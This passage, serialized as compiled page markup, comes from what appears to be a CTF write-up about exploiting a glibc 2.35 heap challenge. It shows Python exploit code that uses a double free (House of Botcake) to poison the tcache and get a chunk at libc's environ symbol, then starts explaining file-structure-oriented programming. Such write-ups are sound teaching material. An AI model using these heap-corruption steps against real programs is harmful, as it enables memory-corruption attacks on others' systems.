punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xe0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x30\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"I kept adding allocs until gdb said the bins were empty. \",(0,n.jsx)(e.em,{children:\"Now\"}),\", we can start doing some exploit chain... right?\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"one-more-leak-now-with-cakes-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#one-more-leak-now-with-cakes-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"One More Leak, now with cakes! \",(0,n.jsx)(\"a\",{name:\"botcake\"})]}),`\n`,(0,n.jsx)(e.p,{children:\"If other protections didn\\u2019t exist, I would be pretty set. But there\\u2019s a couple things in place that prevent me from trying simpler exploits.\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Full RELRO is enabled, so I cannot overwrite \",(0,n.jsx)(e.code,{children:\"GOT\"}),\" to make libc funcs do something else...\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"glibc 2.35 removed \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" and \",(0,n.jsx)(e.code,{children:\"__malloc_hook\"}),\", \",(0,n.jsx)(e.em,{children:\"and\"}),\" I don\\u2019t have a one gadget available due to seccomp...\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Even writing to \",(0,n.jsx)(e.code,{children:\"__exit_funcs\"}),\" isn\\u2019t an option. This is different alternative to the \",(0,n.jsx)(e.code,{children:\"hooks\"}),\", as this is a function table of exit handlers when \",(0,n.jsx)(e.code,{children:\"exit()\"}),\" is called through libc. But this specific program uses \",(0,n.jsx)(e.code,{children:\"_exit()\"}),\" which does \",(0,n.jsx)(e.em,{children:\"not\"}),\" call any exit handlers... \",(0,n.jsx)(e.em,{children:\"and\"}),\" again, seccomp.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Unfortunately, this means I need one more leak: The stack. I need to be able to write to the return address of the stack frame to hijack control of the problem. The usual route is a symbol in libc called \",(0,n.jsx)(e.code,{children:\"environ\"}),\", which stores the address to a position on the stack where the \",(0,n.jsx)(e.code,{children:\"envp\"}),\" array is held. Astute readers will notice the problem with just doing this alone, but lets continue with this route anyway:\"]}),`\n`,(0,n.jsxs)(e.p,{children:['We need to get a chunk to exist in libc, rather than the heap. This is the primary goal of most heap pwn, as depending on the program gives you \"read what where\" or \"write what where\" primitives anywhere in program memory. There is an excellent repository called ',(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/tree/master\",children:\"how2heap\"}),\" which contains tons of POCs for various heap exploits for many versions of glibc. The primative that I\\u2019ll be using, which achieves what I need is called \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c\",children:\"House of Botcake\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"House of Botcake uses a double free bug to confuse malloc and allow use to return a chunk from an arbitrary location. \",(0,n.jsx)(e.code,{children:\"free()\"}),\" can\\u2019t search through the entire heap each time to check whether a chunk is actually free, nor can it always trust the in-use bit, as not every structure on the heap (notably, tcaches) update and respond to the in-use bit. There are some basic detections (like making sure free isn\\u2019t called twice in a row on the same block), but it\\u2019s easily defeated by just freeing another block in between.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"House of Botcake abuses this double free to make a chunk that is part of a consolidated chunk \",(0,n.jsx)(e.em,{children:\"and\"}),\" in the tcache at the same time. I followed \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"this writeup\"}),\" for both botcake usage and a later exploit we need to do:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"First, we allocate 7 0x200 sized blocks, this will fill the tcache for 0x200 and makes any other frees end up in a different bin.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Then, we allocate a previous chunk, and our victim chunk, each of size 0x200.\"}),`\n`,(0,n.jsx)(e.li,{children:\"We\\u2019ll allocate a 16 byte chunk to prevent any further consolidation past our victim chunk\"}),`\n`,(0,n.jsx)(e.li,{children:\"We free those 7 original chunks to actually fill the tcache.\"}),`\n`,(0,n.jsx)(e.li,{children:\"We free our victim chunk, it ends up in the unsorted bin, since its too large for any other bin.\"}),`\n`,(0,n.jsx)(e.li,{children:\"We free our previous chunk, because malloc now sees two large, adjacent chunks, it consoldates them and places a 0x421 size block into the unsorted bin. (malloc automatically allocs 16 bytes more than what we ask, and uses the last byte as a flag, so this is the result of 2 0x210 chunks)\"}),`\n`,(0,n.jsxs)(e.li,{children:[\"We free our victim chunk \",(0,n.jsx)(e.em,{children:\"again\"}),\". This bypasses the naive double free exception, and since our victim chunk has the info for a 0x210 byte block, it gets placed into the tcache (uh oh).\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Now, we alloc a 0x230 sized chunk. Why? Because malloc will split the unsorted block into two, giving us the 0x230 block... but this contains the metadata of our victim chunk, which we now have write control over \",(0,n.jsx)(e.em,{children:\"during\"}),\" our allocation.\"]}),`\n`,(0,n.jsx)(e.li,{children:\"When we now alloc a 0x200 block, we\\u2019ll get the victim chunk, but then the next address that the tcache is pointed to is any address of our choosing!\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The exact payload we provide our \",(0,n.jsx)(e.code,{children:\"0x230\"}),\" chunk is explained below, and the complete code for this is as follows:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Get our environment target!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'environ'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate 7 blocks of size 0x200, we\\u2019ll free them later\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We can\\u2019t leak them as before, so place them into our mem array properly\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate our prev block and our victim block, along with the buffer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'prev'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'victim'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'hello!'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Fill the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our previous chunk (they are now consolidated)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Open up a slot in the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# double free vulnerablity, now victim is in the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We\\u2019re going to write to it the necessary padding then:\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# 0x211, to preserve the size of the victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# environ ^ ((heap + 0x3320) \u003e\u003e 12), because we need to pass a safe-linked ptr.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Otherwise, malloc will crash. 0x3320 offset was found via debugging.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# remove a from the tcache again, updating the linked list structure\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"''\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# this guy is now located at environ!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ah, but we run into a slight issue. I \",(0,n.jsx)(e.em,{children:\"have\"}),\" to send a payload, and sending a newline clobbers the address stored by \",(0,n.jsx)(e.code,{children:\"environ\"}),\". So I need write somewhere that would somehow leak environ for me! There is a method to do this: File Structure Oriented Programming.\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"rop-i-like-fsop-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#rop-i-like-fsop-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"ROP? I Like FSOP. \",(0,n.jsx)(\"a\",{name:\"fsop\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"I\\u2019m going to be honest, when I did this challenge during the CTF, I just saw the line of code that would work for me in the \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"ret2school\"}),\" writeup and copied it. However, I feel that it would be wrong for me to not even try to explain this technique.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"If you have ever used pure \",(0,n.jsx)(e.code,{children:\"open, read, write\"}),\" syscalls, you\\u2019ll be quite familiar interacting with \",(0,n.jsx)(e.em,{children:\"file descriptors\"}),'. These are just integer indexes that correspond to a file currently accessible by your program. Traditionally, 0,1,2 are reserved for the linux \"files\" stdin, stdout, and stderr, which is how you interact with you program. Now, using ',(0,n.jsx)(e.code,{children:\"OWR\"}),\" syscalls can be tedious to use, and libc has provided more feature-rich versions, such as \",(0,n.jsx)(e.code,{children:\"fopen, fprintf, fputc\"}),\", etc. These don\\u2019t use just file descriptors though, instead using a \",(0,n.jsx)(e.code,{children:\"FILE\"}),\" struct, referenced by pointer. Let\\u2019s look at the relevant definition, using \",(0,n.jsx)(e.a,{href:\"https://elixir.bootlin.com/\",children:\"exlir.bootlin.com\"}),\", truncated slightly:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_FILE\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _flags\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* High-order word is _IO_MAGIC; rest is flags. */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* The following pointers correspond to the C++ streambuf protocol. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current read pointer */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of putback+get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current put pointer. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of reserve area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of reserve area. */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* The following fields are used to support backing up and undo. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_save_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Pointer to start of non-current get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_backup_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Pointer to first valid character of backup area */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_save_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Pointer to end of non-current get area. */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_marker\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_markers\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  